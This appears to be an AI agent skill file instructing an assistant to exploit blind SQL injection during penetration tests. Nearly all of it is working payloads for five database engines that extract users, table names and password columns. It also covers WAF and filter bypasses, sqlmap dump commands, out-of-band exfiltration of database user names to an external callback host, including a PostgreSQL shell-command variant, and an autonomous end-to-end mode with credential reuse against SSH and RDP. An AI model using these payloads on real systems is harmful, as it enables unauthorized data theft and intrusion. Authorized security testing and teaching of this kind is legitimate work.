---
name: sql-injection-blind
description: >
  Guide blind SQL injection exploitation (boolean-based, time-based, and
  out-of-band) during authorized penetration testing. Use when the user has a
  SQL injection point but the application does not display query results or error
  messages, or when blind techniques are suggested by another skill. Also
  triggers on: "blind SQLi", "boolean-based", "time-based", "SLEEP injection",
  "WAITFOR DELAY", "pg_sleep", "no output visible", "no errors shown",
  "inferential SQLi", "OOB SQL injection", "DNS exfiltration SQL". OPSEC:
  medium — high request volume for boolean; time-based creates slow query log
  entries; OOB requires external callback infrastructure. Tools: sqlmap,
  burpsuite.
  Do NOT use when errors are visible — use sql-injection-error instead. Do NOT
  use when query output is directly visible — use sql-injection-union instead.
---

# Blind SQL Injection

You are helping a penetration tester exploit blind SQL injection. The target
application does not display query results or error messages, so data must be
extracted indirectly — through boolean conditions, time delays, or out-of-band
channels. All testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Explain each step before executing. Ask which blind
  technique to try first. Show the binary search logic. Confirm findings.
- **Autonomous**: Execute end-to-end. Auto-select technique (boolean > time >
  OOB), use binary search for character extraction, automate with sqlmap when
  manual extraction is confirmed. Report extracted data at milestones.

If unclear, default to guided.

## Prerequisites

- Confirmed SQL injection point (see **web-vuln-discovery**)
- No query output rendered in the response (otherwise use **sql-injection-union**)
- No verbose errors displayed (otherwise use **sql-injection-error**)
- For boolean: a detectable difference between true and false conditions
- For time-based: stable enough network to detect deliberate delays

## Step 1: Assess

If not already provided by the orchestrator or conversation context, determine:
1. **Injection point** — URL, parameter name, request method
2. **Response behavior** — how does the app respond to valid vs invalid input?
3. **DBMS** — if known from other testing

Skip if context was already provided.

## Step 2: Confirm Blind Technique

### Boolean-Based

Inject conditions that produce different responses:
```sql
' AND 1=1--+    -- TRUE — page renders normally
' AND 1=2--+    -- FALSE — page changes (missing content, error, redirect)
```
Compare: response body, Content-Length, status code, specific elements.

### Time-Based

Inject a sleep function and measure response delay:
```sql
' AND SLEEP(5)--+                                          -- MySQL
'; WAITFOR DELAY '0:0:5'--+                                -- MSSQL
' AND 1=(SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--+ -- PostgreSQL
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--+                -- Oracle
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--+ -- SQLite
```

## Step 3: Extract Data — Boolean-Based

Pattern: ask "is the Nth character of [data] equal to X?" via binary search.

### MySQL

```sql
-- Check length first
' AND LENGTH(user())=N--+

-- Binary search character extraction
' AND ASCII(SUBSTRING(user(),1,1))>78--+     -- Is char > 'N'?
' AND ASCII(SUBSTRING(user(),1,1))>90--+     -- Is char > 'Z'?
' AND ASCII(SUBSTRING(user(),1,1))=114--+    -- Is char 'r'?

-- Extract database name
' AND ASCII(SUBSTRING(database(),1,1))>78--+

-- Count tables
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=N--+

-- Extract table name char by char
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>78--+

-- Extract column name
' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='TARGET_TABLE' LIMIT 0,1),1,1))>78--+

-- Extract data
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>78--+
```

**Alternatives** when ASCII/SUBSTRING are blocked:
```sql
' AND (SELECT user()) LIKE 'r%'--+     -- LIKE
' AND (SELECT user()) REGEXP '^r'--+   -- REGEXP
' AND MID(user(),1,1)='r'--+           -- MID (alias for SUBSTRING)
```

### MSSQL

```sql
' AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>78--+
' AND ASCII(SUBSTRING(DB_NAME(),1,1))>78--+
' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN (SELECT TOP 0 name FROM master..sysdatabases)),1,1))>78--+
' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1))>78--+
' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>78--+
```

### PostgreSQL

```sql
' AND ASCII(SUBSTRING(current_user,1,1))>78--+
' AND ASCII(SUBSTRING(current_database(),1,1))>78--+
' AND ASCII(SUBSTRING((SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1),1,1))>78--+
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>78--+
```

### Oracle

```sql
-- Oracle uses SUBSTR instead of SUBSTRING
' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>78--+
' AND ASCII(SUBSTR((SELECT table_name FROM user_tables WHERE ROWNUM=1),1,1))>78--+
' AND ASCII(SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1))>78--+
```

### SQLite

```sql
' AND UNICODE(SUBSTR(sqlite_version(),1,1))>50--+
' AND UNICODE(SUBSTR((SELECT tbl_name FROM sqlite_master WHERE type='table' LIMIT 1),1,1))>78--+
' AND UNICODE(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>78--+
```

## Step 4: Extract Data — Time-Based

Same character-by-character approach, using response delay instead of content differences.

### MySQL

```sql
' AND IF(ASCII(SUBSTRING(user(),1,1))>78,SLEEP(2),0)--+
' AND IF(ASCII(SUBSTRING(database(),1,1))>78,SLEEP(2),0)--+
' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>78,SLEEP(2),0)--+
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>78,SLEEP(2),0)--+
```

**BENCHMARK** alternative:
```sql
' AND IF(ASCII(SUBSTRING(user(),1,1))>78,BENCHMARK(10000000,SHA1('test')),0)--+
```

### MSSQL

```sql
'; IF(ASCII(SUBSTRING(DB_NAME(),1,1))>78) WAITFOR DELAY '0:0:2'--+
'; IF (SELECT ASCII(SUBSTRING(SYSTEM_USER,1,1)))>78 WAITFOR DELAY '0:0:2'--+
```

### PostgreSQL

```sql
' AND 1=(SELECT CASE WHEN ASCII(SUBSTRING(current_user,1,1))>78 THEN pg_sleep(2) ELSE pg_sleep(0) END)--+
' AND 1=(SELECT CASE WHEN ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>78 THEN pg_sleep(2) ELSE pg_sleep(0) END)--+
```

### Oracle

```sql
' AND 1=(SELECT CASE WHEN ASCII(SUBSTR(user,1,1))>78 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',2) ELSE 0 END FROM dual)--+
```

## Step 5: Extract Data — Out-of-Band (OOB)

When neither boolean nor time-based is reliable, exfiltrate via DNS or HTTP callbacks. Requires external infrastructure (Burp Collaborator, interactsh, or custom DNS).

### MySQL (requires FILE privilege)
```sql
' AND LOAD_FILE(CONCAT('\\\\',user(),'.COLLABORATOR.oastify.com\\share'))--+
```

### MSSQL
```sql
'; EXEC master..xp_dirtree '\\'+SYSTEM_USER+'.COLLABORATOR.oastify.com\share'--+
```

### PostgreSQL
```sql
'; COPY (SELECT current_user) TO PROGRAM 'nslookup '||current_user||'.COLLABORATOR.oastify.com'--+
```

### Oracle
```sql
' AND 1=UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.COLLABORATOR.oastify.com/')--+
```

## Step 6: Post-Exploitation

After extracting credentials or key data:
1. **Escalate technique** — if found higher-privilege DB creds, try **sql-injection-union** or **sql-injection-stacked**
2. **File operations** — check read/write capabilities for the confirmed DBMS
3. **Command execution** — route to **sql-injection-stacked**
4. **Credential reuse** — test against SSH, RDP, admin panels

## Step 7: Escalate or Pivot

- **Found UNION works** (column count discovered, output visible): Route to **sql-injection-union**
- **Errors now visible**: Route to **sql-injection-error**
- **Need command execution**: Route to **sql-injection-stacked**
- **Extracted credentials**: Test against other services, document findings

When routing, pass along: injection point, DBMS, confirmed blind technique, current mode, and payloads that worked.

## OPSEC Notes

- Blind SQLi is read-only — no database artifacts
- Boolean-based generates high request volume (detectable by rate monitors)
- Time-based queries appear in slow query logs
- OOB creates DNS queries to unusual subdomains (detectable by DNS monitoring)
- Defenders look for: `SLEEP`, `WAITFOR`, `pg_sleep`, `BENCHMARK`, `ASCII`, `SUBSTRING` patterns

## Deep Reference

For WAF bypass, conditional techniques, and edge cases:

```
Read ~/docs/public-security-references/SQL Injection/MySQL Injection.md
Read ~/docs/public-security-references/SQL Injection/MSSQL Injection.md
Read ~/docs/public-security-references/SQL Injection/PostgreSQL Injection.md
Read ~/docs/public-security-references/SQL Injection/OracleSQL Injection.md
Read ~/docs/public-security-references/SQL Injection/SQLite Injection.md
Read ~/docs/public-security-references/src/pentesting-web/sql-injection/README.md
```

## Troubleshooting

### Boolean Responses Are Inconsistent
- Application may have dynamic content. Find a stable indicator:
  - Specific HTML element present only on "true"
  - Exact response size threshold
  - Specific keyword in response
- In Burp Intruder, use "Grep - Match" to flag a specific string

### Time-Based Is Unreliable
- Increase delay: `SLEEP(5)` instead of `SLEEP(2)`
- Use multiple samples per character and take the median
- Switch to boolean-based if any detectable content difference exists
- Consider OOB if callback infrastructure is available

### WAF Blocking SLEEP/BENCHMARK
```sql
-- MySQL: heavy query instead of SLEEP
' AND IF(1=1,(SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C),0)--+

-- MSSQL: stacked WAITFOR
' AND 1=1 WAITFOR DELAY '0:0:5'--+
```

### Filter Bypass — Blocked Keywords
```sql
MID(str,pos,len)           -- MySQL (alias for SUBSTRING)
SUBSTR(str,pos,len)        -- All DBs
RIGHT(LEFT(str,pos),1)     -- Most DBs
```

### Automated Extraction with sqlmap
```bash
# Boolean-based only
sqlmap -u "https://TARGET/page?id=1" --batch --technique=B --dbs

# Time-based only
sqlmap -u "https://TARGET/page?id=1" --batch --technique=T --dbs

# Both blind techniques
sqlmap -u "https://TARGET/page?id=1" --batch --technique=BT --dbs

# Increase time-based delay for unreliable networks
sqlmap -u "https://TARGET/page?id=1" --batch --technique=T --time-sec=5 --dbs

# Increase threads for faster boolean extraction
sqlmap -u "https://TARGET/page?id=1" --batch --technique=B --threads=8 --dbs

# From Burp request file
sqlmap -r request.txt --batch --technique=BT -p "id" --dbs

# Dump data
sqlmap -r request.txt --batch --technique=BT -D TARGET_DB -T TARGET_TABLE --dump
```
